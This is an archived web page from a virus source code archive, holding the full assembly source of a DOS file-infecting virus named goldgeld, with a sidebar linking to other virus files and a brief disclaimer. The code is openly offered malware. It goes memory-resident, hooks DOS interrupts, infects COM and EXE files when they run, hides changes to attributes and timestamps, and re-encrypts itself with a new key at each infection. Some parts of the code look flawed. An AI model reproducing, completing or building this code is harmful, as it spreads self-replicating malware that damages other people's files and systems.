<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: goldgeld_asm</title>
<meta name="KEYWORDS" content="goldgeld.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for goldgeld.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="g2punish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/g2punish_asm.php">g2punish_asm</a><br>
<a href="g2rainmn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/g2rainmn_asm.php">g2rainmn_asm</a><br>
<a href="gay-rich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gay-rich_asm.php">gay-rich_asm</a><br>
<a href="gcae-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gcae-gen_asm.php">gcae-gen_asm</a><br>
<a href="gde_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gde_pas.php">gde_pas</a><br>
<a href="geiger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/geiger_asm.php">geiger_asm</a><br>
<a href="gen12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gen12_asm.php">gen12_asm</a><br>
<a href="generic__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/generic__asm.php">generic__asm</a><br>
<a href="generic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/generic_asm.php">generic_asm</a><br>
<a href="genius59_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/genius59_asm.php">genius59_asm</a><br>
<a href="getscr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/getscr_asm.php">getscr_asm</a><br>
<a href="gh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gh_asm.php">gh_asm</a><br>
<a href="gidra_16_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gidra_16_asm.php">gidra_16_asm</a><br>
<a href="gidra469_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gidra469_asm.php">gidra469_asm</a><br>
<a href="gldbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gldbug_asm.php">gldbug_asm</a><br>
<a href="globe_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/globe_c.php">globe_c</a><br>
<a href="gloom_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gloom_c.php">gloom_c</a><br>
<a href="gobble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gobble_asm.php">gobble_asm</a><br>
<a href="gold-bu__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gold-bu__asm.php">gold-bu__asm</a><br>
<a href="gold_bug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gold_bug_asm.php">gold_bug_asm</a><br>
<a href="gold-bug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gold-bug_asm.php">gold-bug_asm</a><br>
<a href="goldbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/goldbug_asm.php">goldbug_asm</a><br>
<a href="goldgeld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/goldgeld_asm.php">goldgeld_asm</a><br>
<a href="gomb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gomb_asm.php">gomb_asm</a><br>
<a href="gotcha17_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha17_asm.php">gotcha17_asm</a><br>
<a href="gotcha1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha1__asm.php">gotcha1__asm</a><br>
<a href="gotcha9e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha9e_asm.php">gotcha9e_asm</a><br>
<a href="gotcha_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha_e_asm.php">gotcha_e_asm</a><br>
<a href="gotcha-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha-e_asm.php">gotcha-e_asm</a><br>
<a href="gothvamp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gothvamp_asm.php">gothvamp_asm</a><br>
<a href="gpe_gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gpe_gen_asm.php">gpe_gen_asm</a><br>
<a href="gpe-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gpe-gen_asm.php">gpe-gen_asm</a><br>
<a href="greenjok_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/greenjok_asm.php">greenjok_asm</a><br>
<a href="greeting_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/greeting_asm.php">greeting_asm</a><br>
<a href="grither__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/grither__asm.php">grither__asm</a><br>
<a href="grither_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/grither_asm.php">grither_asm</a><br>
<a href="gtcha17_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gtcha17_asm.php">gtcha17_asm</a><br>
<a href="gun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gun_asm.php">gun_asm</a><br>
<a href="gunther_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gunther_asm.php">gunther_asm</a><br>
<a href="guppy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/guppy_asm.php">guppy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    0                      ; For easy calculation of offsets
id = 'SS'                               ; ID word for EXE infections

startvirus:
decrypt:  loop decrypt                  ; handles encryption and decryption
          mov  bx,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  bp,offset startencrypt   ; start of decryption
decrypt_loop:
          db   2eh,81h,46h,0            ; add word ptr cs:[bp], xxxx
decrypt_value dw  0                     ; initialised at zero for null effect
          inc  bp                       ; calculate new decryption location
          inc  bp
          dec  bx                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          push ds
          push es

          mov  ax, es                   ; Get PSP
          dec  ax
          mov  ds, ax                   ; Get MCB

          sub  word ptr ds:[3],((endheap-startvirus+1023)/1024)*64
          sub  word ptr ds:[12h],((endheap-startvirus+1023)/1024)*64
          mov  es,word ptr ds:[12h]

          push cs
          pop  ds
          xor  di,di                    ; Destination
          mov  cx,(heap-startvirus)/2+1 ; Bytes to zopy
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          rep  movsw

          mov  di,offset encrypt
          mov  si,bp                    ; lea  si,[bp+offset startvirus]
          mov  cx,startencrypt-decrypt
          rep  movsb
          mov  al,0c3h                  ; retn
          stosb

          xor  ax,ax
          mov  ds,ax
          sub  word ptr ds:[413h],(endheap-startvirus+1023)/1024
          push ds
          lds  ax,ds:[21h*4]            ; Get old int handler
          mov  word ptr es:oldint21, ax
          mov  word ptr es:oldint21+2, ds
          pop  ds
          mov  word ptr ds:[21h*4], offset int21 ; Replace with new handler
          mov  ds:[21h*4+2], es         ; in high memory

          xor  ax,ax
          mov  ds,ax
          sub  word ptr ds:[413h],(endheap-startvirus+1023)/1024
          push ds
          lds  ax,ds:[09h*4]            ; Get old int handler
          mov     word ptr int09h,ax
          mov     word ptr int09h[2],ds
          pop  ds
          mov  word ptr ds:[09h*4], offset int21 ; Replace with new handler
          mov  ds:[09h*4+2], es         ; in high memory

done_install:
          mov  ah,2ch                   ; Get current time
          int  21h
          cmp  dl,80                    ; Check the percentage
          jae  activate

exit_virus:
          pop  es
          pop  ds
          cmp  sp,id                    ; EXE or COM?
          jz   returnEXE
returnCOM:
          lea  si,[bp+offset save3]
          mov  di,100h
          push di                       ; For later return
          movsw
          movsb
          retn                          ; 100h is on stack
returnEXE:
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+oldCSIP+2],ax
          add  ax,word ptr cs:[bp+oldSSSP+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+oldSSSP]
          mov  ss,ax
          sti


activate:                              ; Conditions satisfied
          jmp  exit_virus

int21:                                  ; New interrupt handler
          cmp  ax,'VC'                  ; Installation check?
          jnz  notinstall
          mov  ax,'PS'
          iret
notinstall:
          pushf
          push ax
          push bx
          push cx
          push dx
          push si
          push di                       ; don't need to save bp
          push ds
          push es
          cmp  ax,4b00h                 ; Infect on execute
          jz   infectDSDX
exithandler:
          pop  es
          pop  ds
          pop  di
          pop  si
          pop  dx
          pop  cx
          pop  bx
          pop  ax
          popf
          db 0eah                       ; JMP SSSS:OOOO
oldint21  dd ?                          ; Go to orig handler

infectDSDX:
          mov  ax,4300h
          int  21h
          push ds
          push dx
          push cx                       ; Save attributes
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx

          mov  ax,5700h                 ; Get creation date/time
          int  21h
          push cx                       ; Save date and
          push dx                       ; time

          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          mov  ah,3fh                   ; Read file to buffer
          mov  dx,offset buffer         ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ax,4202h                 ; Go to end of file
          xor  cx,cx
          cwd
          int  21h

          mov  word ptr filesize,ax
          mov  word ptr filesize+2,dx
          cmp  word ptr buffer,'ZM'     ; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr filesize
          mov  cx,word ptr buffer+1     ; get jmp location
          add  cx,heap-startvirus+3     ; Adjust for virus size
          cmp  ax,cx                    ; Already infected?
          je   done_file
          jmp  infect_com
checkEXE:
          cmp  word ptr buffer+10h,id   ; is it already infected?
          jnz  infect_exe
done_file:
          mov  ax,5701h                 ; Restore creation date/time
          pop  dx                       ; Restore date and
          pop  cx                       ; time
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          pop  cx
          pop  dx
          pop  ds                       ; Restore filename
          call attributes               ; attributes

          jmp  exithandler
infect_exe:
          mov  cx, 1ah
          push cx
          push bx                       ; Save file handle
          les  ax,dword ptr buffer+14h  ; Save old entry point
          mov  word ptr oldCSIP, ax
          mov  word ptr oldCSIP+2, es

          les  ax,dword ptr buffer+0Eh  ; Save old stack
          mov  word ptr oldSSSP,es
          mov  word ptr oldSSSP+2,ax

          mov  ax,word ptr buffer+8     ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax,dword ptr filesize    ; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr buffer+14h, dx  ; New entry point
          mov  word ptr buffer+16h, ax

          mov  word ptr buffer+0Eh, ax  ; and stack
          mov  word ptr buffer+10h, id

          pop  dx                       ; get file length
          pop  ax
          pop  bx                       ; Restore file handle

          add  ax, heap-startvirus      ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr buffer+4, dx    ; new file size
          mov  word ptr buffer+2, ax

          push cs                       ; restore ES
          pop  es

          mov  ax,word ptr buffer+14h   ; needed later
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          push cx
          sub  ax,cx
          mov  si,offset buffer
          mov  di,offset save3
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
finishinfection:
          add  ax,offset startencrypt-offset decrypt
          mov  word ptr encrypt+(patch_startencrypt-startvirus)+1,ax

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  word ptr encrypt+(decrypt_value-startvirus),dx ; New encrypt. value
          xor  byte ptr encrypt+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          xor  si,si                    ; copy virus to buffer
          mov  di,offset zopystuff
          mov  cx,heap-startvirus
          rep  movsb

          mov  si,offset encrypt        ; copy encryption function
          mov  di,offset zopystuff
          mov  cx,startencrypt-decrypt
          rep  movsb

          xor  byte ptr zopystuff+(decrypt_loop-startvirus)+2,028h ; flip between add/sub

          mov  word ptr [encrypt+(patch_startencrypt-startvirus)+1],offset zopystuff+(startencrypt-decrypt)

          push bp
          push bx
          call encrypt
          pop  bx
          pop  bp

          mov  ah,40h                   ; Concatenate virus
          mov  dx,offset zopystuff
          mov  cx,heap-startvirus       ; # bytes to write
          int  21h

          mov  ax,4200h                 ; Move file pointer
          xor  cx,cx                    ; to beginning of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,40h                   ; Write to file
          mov  dx,offset buffer         ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          jmp  done_file

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          int  21h
          ret

          db   0eah                     ; jmp ssss:oooo
save3     db 0cdh,20h,0                 ; First 3 bytes of COM file
oldCSIP   db ?                          ; Original CS:IP (4 bytes)
oldSSSP   dd ?                          ; Original SS:SP
heap:                                   ; Variables not in code
filesize  dd ?
encrypt:  db startencrypt-decrypt+1 dup (?)
zopystuff db heap-startvirus dup (?)    ; Encryption buffer
buffer    db 1ah dup (?)                ; read buffer
endheap:                                ; End of virus
end       startvirus

</textarea></td></tr></table></body></html>
